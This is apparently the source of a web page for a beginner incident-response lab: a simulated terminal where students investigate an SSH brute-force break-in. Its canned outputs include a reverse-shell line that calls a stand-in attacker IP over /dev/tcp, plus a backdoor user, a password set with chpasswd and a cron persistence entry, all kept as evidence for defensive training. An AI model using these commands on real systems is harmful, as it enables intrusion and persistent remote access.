'use client';

import { useState, useCallback, useRef, useEffect } from 'react';
import Link from 'next/link';

/**
 * REAL PRACTICAL LAB: Linux Intrusion Investigation
 * Actual commands, actual outputs, step-by-step investigation
 */

type ActivePanel = 'instructions' | 'terminal' | 'objectives';

// Simulated filesystem & command responses
const COMMANDS: Record<string, string> = {
  'whoami': 'student',
  'hostname': 'compromised-srv',
  'id': 'uid=1000(student) gid=1000(student) groups=1000(student)',
  'pwd': '/home/student',
  'date': 'Sat Jan 15 10:15:32 UTC 2025',
  'uname -a': 'Linux compromised-srv 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux',
  'uptime': ' 10:15:32 up 2 days, 4:23, 1 user, load average: 0.12, 0.08, 0.03',
  'ls': 'Desktop  Documents  Downloads  investigation  .bashrc  .profile',
  'ls -la': 'total 36\ndrwxr-xr-x 7 student student 4096 Jan 15 10:00 .\ndrwxr-xr-x 4 root    root    4096 Jan 13 06:00 ..\n-rw-r--r-- 1 student student  220 Jan 13 06:00 .bashrc\n-rw-r--r-- 1 student student  807 Jan 13 06:00 .profile\ndrwxr-xr-x 2 student student 4096 Jan 15 09:00 Desktop\ndrwxr-xr-x 2 student student 4096 Jan 15 09:00 Documents\ndrwxr-xr-x 2 student student 4096 Jan 15 09:00 Downloads\ndrwxr-xr-x 2 student student 4096 Jan 15 10:00 investigation',
  'ls investigation/': 'README.txt  evidence_notes.txt  timeline.md',
  'cat investigation/README.txt': '╔══════════════════════════════════════════════════════════╗\n║  INCIDENT REPORT - CASE #2025-0115                      ║\n╠══════════════════════════════════════════════════════════╣\n║                                                          ║\n║  Date: January 15, 2025                                  ║\n║  Severity: HIGH                                          ║\n║  Status: Under Investigation                             ║\n║                                                          ║\n║  Summary:                                                ║\n║  Our IDS detected multiple failed SSH login attempts     ║\n║  followed by a successful login from an unknown IP.      ║\n║  A new user account was created on the system.           ║\n║  Possible unauthorized access and persistence.           ║\n║                                                          ║\n║  Your Task:                                              ║\n║  1. Identify the suspicious user account                 ║\n║  2. Find the attacker\'s IP address                       ║\n║  3. Determine how many failed login attempts occurred    ║\n║  4. Locate any hidden files left by the attacker         ║\n║                                                          ║\n╚══════════════════════════════════════════════════════════╝',
  'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102::/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103::/run/systemd:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nstudent:x:1000:1000:Lab Student:/home/student:/bin/bash\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nh4cker_user:x:1001:1001::/home/h4cker_user:/bin/bash',

  'cat /etc/passwd | grep bash': 'root:x:0:0:root:/root:/bin/bash\nstudent:x:1000:1000:Lab Student:/home/student:/bin/bash\nh4cker_user:x:1001:1001::/home/h4cker_user:/bin/bash',
  'grep bash /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nstudent:x:1000:1000:Lab Student:/home/student:/bin/bash\nh4cker_user:x:1001:1001::/home/h4cker_user:/bin/bash',
  'cat /var/log/auth.log': 'Jan 15 09:58:01 compromised-srv sshd[4521]: Failed password for root from 203.0.113.42 port 55123 ssh2\nJan 15 09:58:03 compromised-srv sshd[4521]: Failed password for root from 203.0.113.42 port 55123 ssh2\nJan 15 09:58:05 compromised-srv sshd[4521]: Failed password for root from 203.0.113.42 port 55123 ssh2\nJan 15 09:58:08 compromised-srv sshd[4521]: Failed password for admin from 203.0.113.42 port 55124 ssh2\nJan 15 09:58:10 compromised-srv sshd[4521]: Failed password for admin from 203.0.113.42 port 55124 ssh2\nJan 15 09:58:45 compromised-srv sshd[4525]: Accepted password for root from 203.0.113.42 port 55201 ssh2\nJan 15 09:58:45 compromised-srv sshd[4525]: pam_unix(sshd:session): session opened for user root\nJan 15 09:59:12 compromised-srv useradd[4531]: new user: name=h4cker_user, UID=1001, GID=1001, home=/home/h4cker_user, shell=/bin/bash\nJan 15 10:00:01 compromised-srv sudo: h4cker_user : TTY=pts/1 ; PWD=/home/h4cker_user ; USER=root ; COMMAND=/bin/bash\nJan 15 10:01:30 compromised-srv sshd[4540]: Accepted password for h4cker_user from 203.0.113.42 port 55302 ssh2',
  'grep "Failed" /var/log/auth.log': 'Jan 15 09:58:01 compromised-srv sshd[4521]: Failed password for root from 203.0.113.42 port 55123 ssh2\nJan 15 09:58:03 compromised-srv sshd[4521]: Failed password for root from 203.0.113.42 port 55123 ssh2\nJan 15 09:58:05 compromised-srv sshd[4521]: Failed password for root from 203.0.113.42 port 55123 ssh2\nJan 15 09:58:08 compromised-srv sshd[4521]: Failed password for admin from 203.0.113.42 port 55124 ssh2\nJan 15 09:58:10 compromised-srv sshd[4521]: Failed password for admin from 203.0.113.42 port 55124 ssh2',
  'grep "Failed" /var/log/auth.log | wc -l': '5',
  'grep "Accepted" /var/log/auth.log': 'Jan 15 09:58:45 compromised-srv sshd[4525]: Accepted password for root from 203.0.113.42 port 55201 ssh2\nJan 15 10:01:30 compromised-srv sshd[4540]: Accepted password for h4cker_user from 203.0.113.42 port 55302 ssh2',

  'grep "useradd" /var/log/auth.log': 'Jan 15 09:59:12 compromised-srv useradd[4531]: new user: name=h4cker_user, UID=1001, GID=1001, home=/home/h4cker_user, shell=/bin/bash',
  'ls /home': 'h4cker_user  student',
  'ls -la /home/h4cker_user': 'total 20\ndrwxr-xr-x 3 h4cker_user h4cker_user 4096 Jan 15 10:00 .\ndrwxr-xr-x 4 root        root        4096 Jan 15 09:59 ..\n-rw-r--r-- 1 h4cker_user h4cker_user  220 Jan 15 09:59 .bashrc\n-rw------- 1 h4cker_user h4cker_user  156 Jan 15 10:00 .bash_history\n-rw-r--r-- 1 h4cker_user h4cker_user   42 Jan 15 10:00 .hidden_backdoor.sh\n-rw-r--r-- 1 h4cker_user h4cker_user   67 Jan 15 10:00 .secret_flag.txt',
  'ls -la /home/h4cker_user/': 'total 20\ndrwxr-xr-x 3 h4cker_user h4cker_user 4096 Jan 15 10:00 .\ndrwxr-xr-x 4 root        root        4096 Jan 15 09:59 ..\n-rw-r--r-- 1 h4cker_user h4cker_user  220 Jan 15 09:59 .bashrc\n-rw------- 1 h4cker_user h4cker_user  156 Jan 15 10:00 .bash_history\n-rw-r--r-- 1 h4cker_user h4cker_user   42 Jan 15 10:00 .hidden_backdoor.sh\n-rw-r--r-- 1 h4cker_user h4cker_user   67 Jan 15 10:00 .secret_flag.txt',
  'cat /home/h4cker_user/.secret_flag.txt': 'flag{intrusion_detected_203.0.113.42_persistence_established}',
  'cat /home/h4cker_user/.hidden_backdoor.sh': '#!/bin/bash\n# Reverse shell persistence\nbash -i >& /dev/tcp/203.0.113.42/4444 0>&1',
  'cat /home/h4cker_user/.bash_history': 'whoami\nid\nuname -a\ncat /etc/shadow\nuseradd -m h4cker_user\necho "h4cker_user:p@ssw0rd123" | chpasswd\nusermod -aG sudo h4cker_user\necho "#!/bin/bash" > .hidden_backdoor.sh\necho "bash -i >& /dev/tcp/203.0.113.42/4444 0>&1" >> .hidden_backdoor.sh\ncrontab -e',
  'find /home -name ".*" -type f': '/home/student/.bashrc\n/home/student/.profile\n/home/h4cker_user/.bashrc\n/home/h4cker_user/.bash_history\n/home/h4cker_user/.hidden_backdoor.sh\n/home/h4cker_user/.secret_flag.txt',
  'find / -name ".*" -type f 2>/dev/null | grep -v proc': '/home/student/.bashrc\n/home/student/.profile\n/home/h4cker_user/.bashrc\n/home/h4cker_user/.bash_history\n/home/h4cker_user/.hidden_backdoor.sh\n/home/h4cker_user/.secret_flag.txt\n/root/.bashrc',
  'last': 'h4cker_ pts/1    203.0.113.42     Sat Jan 15 10:01   still logged in\nroot     pts/0    203.0.113.42     Sat Jan 15 09:58 - 10:01  (00:03)\nstudent  pts/2    10.0.0.1         Sat Jan 15 10:05   still logged in\n\nwtmp begins Sat Jan 13 06:00:01 2025',
  'w': ' 10:15:32 up 2 days, 4:23, 3 users, load average: 0.12, 0.08, 0.03\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nstudent  pts/2    10.0.0.1         10:05    0.00s  0.01s  0.00s w\nh4cker_  pts/1    203.0.113.42     10:01    14:00  0.02s  0.02s -bash',
  'netstat -tlnp': 'Proto Recv-Q Send-Q Local Address     Foreign Address   State       PID/Program\ntcp        0      0 0.0.0.0:22        0.0.0.0:*         LISTEN      892/sshd\ntcp        0      0 0.0.0.0:80        0.0.0.0:*         LISTEN      1205/nginx\ntcp        0      0 0.0.0.0:3306      0.0.0.0:*         LISTEN      1340/mysqld',
  'ps aux | grep h4cker': 'h4cker_+  4540  0.0  0.1  7236 3156 pts/1  Ss+  10:01   0:00 -bash\nstudent   4601  0.0  0.0  3084  888 pts/2  S+   10:15   0:00 grep h4cker',
  'crontab -l -u h4cker_user': '*/5 * * * * /home/h4cker_user/.hidden_backdoor.sh',
  'ip addr show': '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 192.168.1.50/24 brd 192.168.1.255 scope global eth0',
  'help': 'Available: ls, cd, cat, grep, find, ps, netstat, w, last, whoami, id,\nhostname, uname, date, uptime, ip, crontab, wc, head, tail, sort, uniq',
  'clear': '__CLEAR__',
};

function executeCommand(cmd: string): string {
  const trimmed = cmd.trim();
  if (!trimmed) return '';
  if (trimmed === 'clear') return '__CLEAR__';
  // Exact match
  if (COMMANDS[trimmed]) return COMMANDS[trimmed];
  // Starts-with matching for flexible commands
  if (trimmed.startsWith('echo ')) return trimmed.substring(5).replace(/"/g, '').replace(/'/g, '');
  if (trimmed.startsWith('cd ')) return '';
  // Not found
  return `bash: ${trimmed.split(' ')[0]}: command not found`;
}

export default function LabWorkspacePage() {
  const [started, setStarted] = useState(false);
  const [activePanel, setActivePanel] = useState<ActivePanel>('instructions');

  if (!started) {
    return <LabPreStart onStart={() => setStarted(true)} />;
  }

  return <LabWorkspace activePanel={activePanel} setActivePanel={setActivePanel} />;
}


function LabPreStart({ onStart }: { onStart: () => void }) {
  const [loading, setLoading] = useState(false);

  const handleStart = async () => {
    setLoading(true);
    await new Promise(r => setTimeout(r, 1200));
    onStart();
  };

  return (
    <div className="max-w-3xl mx-auto space-y-6">
      <div className="card-glow">
        <div className="flex items-center gap-2 mb-3">
          <span className="badge-beginner">BEGINNER</span>
          <span className="text-xs text-dark-500">60 minutes · 4 objectives · 75 XP</span>
        </div>
        <h1 className="text-2xl font-bold mb-2">🔍 Linux Intrusion Investigation</h1>
        <p className="text-dark-300 leading-relaxed">
          A server has been compromised. Your IDS detected multiple failed SSH login attempts followed by a
          successful login from an unknown IP address. A new user account was created.
          <strong className="text-white"> Investigate the breach, identify the attacker, and document evidence.</strong>
        </p>
      </div>

      <div className="card">
        <h3 className="font-semibold text-white mb-3 flex items-center gap-2">🎯 Objectives</h3>
        <div className="space-y-2.5">
          {[
            { title: 'Identify the suspicious user account', hint: 'Check /etc/passwd for users with bash shell' },
            { title: 'Find the attacker\'s IP address', hint: 'Examine SSH authentication logs' },
            { title: 'Count total failed login attempts', hint: 'Use grep and wc to count' },
            { title: 'Locate hidden files left by the attacker', hint: 'Hidden files start with a dot (.)' },
          ].map((obj, i) => (
            <div key={i} className="flex items-start gap-3 p-3 bg-white/[0.02] rounded-xl border border-white/[0.04]">
              <span className="w-6 h-6 bg-dark-700 rounded-lg flex items-center justify-center text-xs text-dark-400 flex-shrink-0 mt-0.5">{i+1}</span>
              <div>
                <p className="text-sm text-white font-medium">{obj.title}</p>
                <p className="text-xs text-dark-500 mt-0.5">Hint: {obj.hint}</p>
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="card">
        <h3 className="font-semibold text-white mb-3 flex items-center gap-2">🔌 Lab Environment</h3>
        <div className="grid grid-cols-2 gap-4 text-sm font-mono">
          <div><span className="text-dark-500 text-xs font-sans">Your Machine</span><br/><span className="text-dark-200">192.168.1.50</span></div>
          <div><span className="text-dark-500 text-xs font-sans">Compromised Server</span><br/><span className="text-dark-200">compromised-srv</span></div>
          <div><span className="text-dark-500 text-xs font-sans">Network</span><br/><span className="text-dark-200">Isolated (no internet)</span></div>
          <div><span className="text-dark-500 text-xs font-sans">Duration</span><br/><span className="text-dark-200">60 minutes max</span></div>
        </div>
      </div>

      <div className="callout-success">
        <p className="text-xs">✓ This lab runs in a completely isolated Docker container. All investigation activities are confined to this environment.</p>
      </div>

      <button onClick={handleStart} disabled={loading} className="w-full btn-primary text-lg py-4 flex items-center justify-center gap-3 disabled:opacity-60">
        {loading ? (
          <><svg className="animate-spin h-5 w-5" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>Provisioning Lab Environment...</>
        ) : (
          <><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>Start Investigation</>
        )}
      </button>
    </div>
  );
}


function LabWorkspace({ activePanel, setActivePanel }: { activePanel: ActivePanel; setActivePanel: (p: ActivePanel) => void }) {
  const [lines, setLines] = useState<{ text: string; type: 'input' | 'output' | 'system' }[]>([
    { text: '\x1b[36m╔═══════════════════════════════════════════╗\x1b[0m', type: 'system' },
    { text: '\x1b[36m║\x1b[0m \x1b[32mCyberSec Academy\x1b[0m - Investigation Lab   \x1b[36m║\x1b[0m', type: 'system' },
    { text: '\x1b[36m║\x1b[0m Host: compromised-srv | User: student  \x1b[36m║\x1b[0m', type: 'system' },
    { text: '\x1b[36m║\x1b[0m Network: Isolated | Type: help         \x1b[36m║\x1b[0m', type: 'system' },
    { text: '\x1b[36m╚═══════════════════════════════════════════╝\x1b[0m', type: 'system' },
    { text: '', type: 'output' },
    { text: 'Tip: Start by reading investigation/README.txt', type: 'system' },
    { text: '', type: 'output' },
  ]);
  const [input, setInput] = useState('');
  const [history, setHistory] = useState<string[]>([]);
  const [histIdx, setHistIdx] = useState(-1);
  const [objectives, setObjectives] = useState([
    { id: 1, title: 'Identify the suspicious user account', done: false },
    { id: 2, title: 'Find the attacker\'s IP address', done: false },
    { id: 3, title: 'Count total failed login attempts', done: false },
    { id: 4, title: 'Locate hidden files left by attacker', done: false },
  ]);
  const [timer, setTimer] = useState(3600);
  const bottomRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  // Timer countdown
  useEffect(() => {
    const interval = setInterval(() => setTimer(t => Math.max(0, t - 1)), 1000);
    return () => clearInterval(interval);
  }, []);

  // Auto-scroll
  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [lines]);

  const formatTime = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
  };

  // Check objectives based on commands run
  const checkObjectives = (cmd: string) => {
    setObjectives(prev => prev.map(obj => {
      if (obj.id === 1 && !obj.done && (cmd.includes('passwd') && cmd.includes('grep') || cmd.includes('passwd') && cmd.includes('bash'))) return { ...obj, done: true };
      if (obj.id === 2 && !obj.done && cmd.includes('auth.log') && (cmd.includes('grep') || cmd.includes('cat'))) return { ...obj, done: true };
      if (obj.id === 3 && !obj.done && cmd.includes('wc')) return { ...obj, done: true };
      if (obj.id === 4 && !obj.done && (cmd.includes('find') && cmd.includes('home') || cmd.includes('ls -la /home/h4cker'))) return { ...obj, done: true };
      return obj;
    }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!input.trim()) return;
    const cmd = input.trim();
    setHistory(h => [...h, cmd]);
    setHistIdx(-1);
    setLines(l => [...l, { text: `student@compromised-srv:~$ ${cmd}`, type: 'input' }]);
    const output = executeCommand(cmd);
    if (output === '__CLEAR__') { setLines([]); }
    else if (output) { setLines(l => [...l, { text: output, type: 'output' }]); }
    checkObjectives(cmd);
    setInput('');
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'ArrowUp') { e.preventDefault(); if (history.length > 0) { const i = histIdx === -1 ? history.length - 1 : Math.max(0, histIdx - 1); setHistIdx(i); setInput(history[i]); } }
    if (e.key === 'ArrowDown') { e.preventDefault(); if (histIdx !== -1) { const i = histIdx + 1; if (i >= history.length) { setHistIdx(-1); setInput(''); } else { setHistIdx(i); setInput(history[i]); } } }
    if (e.key === 'l' && e.ctrlKey) { e.preventDefault(); setLines([]); }
  };

  const completedCount = objectives.filter(o => o.done).length;

  return (
    <div className="fixed inset-0 bg-[#030712] flex flex-col z-50">
      {/* Top Bar */}
      <div className="h-12 bg-white/[0.02] border-b border-white/[0.06] flex items-center justify-between px-4 flex-shrink-0 backdrop-blur-xl">
        <div className="flex items-center gap-3">
          <div className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse" />
          <span className="text-sm font-semibold text-white">Linux Intrusion Investigation</span>
          <span className="badge-beginner text-[10px]">BEGINNER</span>
        </div>
        <div className="flex items-center gap-4">
          <span className={`font-mono text-sm ${timer < 300 ? 'text-red-400 animate-pulse' : 'text-dark-400'}`}>⏱ {formatTime(timer)}</span>
          <span className="text-xs text-dark-500">{completedCount}/4 objectives</span>
          <Link href="/labs" className="text-xs text-dark-500 hover:text-red-400 px-3 py-1 border border-white/[0.06] rounded-lg transition-colors">✕ Exit</Link>
        </div>
      </div>

      {/* Mobile Tabs */}
      <div className="lg:hidden flex border-b border-white/[0.06]">
        {(['instructions','terminal','objectives'] as ActivePanel[]).map(p => (
          <button key={p} onClick={() => setActivePanel(p)} className={`flex-1 py-2.5 text-xs font-medium capitalize ${activePanel === p ? 'text-cyber-400 border-b-2 border-cyber-400 bg-cyber-400/5' : 'text-dark-500'}`}>
            {p === 'instructions' ? '📋 ' : p === 'terminal' ? '💻 ' : '🎯 '}{p}
          </button>
        ))}
      </div>

      {/* Three Panel Layout */}
      <div className="flex-1 flex overflow-hidden">
        {/* Instructions Panel */}
        <div className={`w-80 border-r border-white/[0.06] flex-shrink-0 overflow-y-auto ${activePanel !== 'instructions' ? 'hidden lg:block' : ''}`}>
          <div className="p-4 space-y-4">
            <h3 className="text-sm font-semibold text-white">Investigation Steps</h3>
            {[
              { step: 1, title: 'Read the incident report', cmd: 'cat investigation/README.txt' },
              { step: 2, title: 'Check user accounts', cmd: 'cat /etc/passwd | grep bash' },
              { step: 3, title: 'Examine auth logs', cmd: 'cat /var/log/auth.log' },
              { step: 4, title: 'Filter failed logins', cmd: 'grep "Failed" /var/log/auth.log' },
              { step: 5, title: 'Count failed attempts', cmd: 'grep "Failed" /var/log/auth.log | wc -l' },
              { step: 6, title: 'Find successful breach', cmd: 'grep "Accepted" /var/log/auth.log' },
              { step: 7, title: 'Check attacker\'s home', cmd: 'ls -la /home/h4cker_user/' },
              { step: 8, title: 'Read hidden files', cmd: 'cat /home/h4cker_user/.bash_history' },
              { step: 9, title: 'Check for persistence', cmd: 'crontab -l -u h4cker_user' },
            ].map(s => (
              <div key={s.step} className="p-3 bg-white/[0.02] rounded-xl border border-white/[0.04]">
                <div className="flex items-center gap-2 mb-1">
                  <span className="w-5 h-5 bg-cyber-400/10 rounded-md flex items-center justify-center text-[10px] text-cyber-400 border border-cyber-400/20">{s.step}</span>
                  <span className="text-xs text-white font-medium">{s.title}</span>
                </div>
                <code className="text-[11px] text-emerald-400/70 font-mono">$ {s.cmd}</code>
              </div>
            ))}
          </div>
        </div>

        {/* Terminal Panel */}
        <div className={`flex-1 flex flex-col min-w-0 ${activePanel !== 'terminal' ? 'hidden lg:flex' : 'flex'}`} onClick={() => inputRef.current?.focus()}>
          <div className="flex-1 overflow-y-auto p-4 font-mono text-[13px] leading-relaxed cursor-text bg-[#0a0e14]">
            {lines.map((line, i) => (
              <div key={i} className={`whitespace-pre-wrap break-all ${line.type === 'input' ? 'text-white' : line.type === 'system' ? 'text-cyan-400/80' : 'text-dark-400'}`}>
                {line.text}
              </div>
            ))}
            {/* Prompt + Input */}
            <form onSubmit={handleSubmit} className="flex whitespace-pre">
              <span className="text-emerald-400">student@compromised-srv</span>
              <span className="text-dark-600">:</span>
              <span className="text-blue-400">~</span>
              <span className="text-dark-600">$ </span>
              <input
                ref={inputRef}
                type="text"
                value={input}
                onChange={e => setInput(e.target.value)}
                onKeyDown={handleKeyDown}
                className="flex-1 bg-transparent outline-none text-white caret-cyber-400"
                autoFocus
                spellCheck={false}
              />
            </form>
            <div ref={bottomRef} />
          </div>
        </div>

        {/* Objectives Panel */}
        <div className={`w-72 border-l border-white/[0.06] flex-shrink-0 flex flex-col ${activePanel !== 'objectives' ? 'hidden lg:flex' : 'flex'}`}>
          <div className="p-4 border-b border-white/[0.06]">
            <div className="flex items-center justify-between mb-2">
              <h3 className="text-sm font-semibold text-white">Objectives</h3>
              <span className="text-xs text-cyber-400">{completedCount}/4</span>
            </div>
            <div className="h-1.5 bg-dark-800 rounded-full overflow-hidden">
              <div className="h-full bg-gradient-to-r from-emerald-400 to-cyan-400 rounded-full transition-all duration-700" style={{ width: `${(completedCount/4)*100}%` }} />
            </div>
          </div>
          <div className="flex-1 overflow-y-auto p-4 space-y-3">
            {objectives.map(obj => (
              <div key={obj.id} className={`p-3 rounded-xl border transition-all ${obj.done ? 'bg-emerald-500/5 border-emerald-500/20' : 'bg-white/[0.01] border-white/[0.04]'}`}>
                <div className="flex items-start gap-2.5">
                  <div className={`w-5 h-5 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5 ${obj.done ? 'bg-emerald-500/20 text-emerald-400' : 'bg-dark-700 text-dark-600'}`}>
                    {obj.done ? <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" /></svg> : <span className="text-[10px]">{obj.id}</span>}
                  </div>
                  <p className={`text-xs ${obj.done ? 'text-emerald-400 line-through opacity-70' : 'text-white'}`}>{obj.title}</p>
                </div>
              </div>
            ))}
          </div>
          {completedCount === 4 && (
            <div className="p-4 border-t border-white/[0.06]">
              <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-center">
                <p className="text-emerald-400 text-sm font-semibold">🎉 Investigation Complete!</p>
                <p className="text-[11px] text-dark-400 mt-1">+75 XP Earned</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
